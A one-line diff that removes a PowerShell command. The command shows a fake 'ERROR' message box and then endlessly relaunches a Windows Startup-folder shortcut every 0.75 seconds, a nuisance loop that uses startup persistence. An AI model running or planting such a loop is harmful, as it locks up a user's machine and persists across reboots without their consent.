@@ -1,1 +1,0 @@
-powershell.exe -Version 2.0 -NoExit mode con:cols=18 lines=1; Add-Type -AssemblyName PresentationCore,PresentationFramework; $msgBoxInput = [System.Windows.MessageBox]::Show('ERROR','ERROR','0','16'); while ($true) {start-process "C:\Users\s-agridin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\shortcut.lnk"; start-sleep -seconds 0.75}
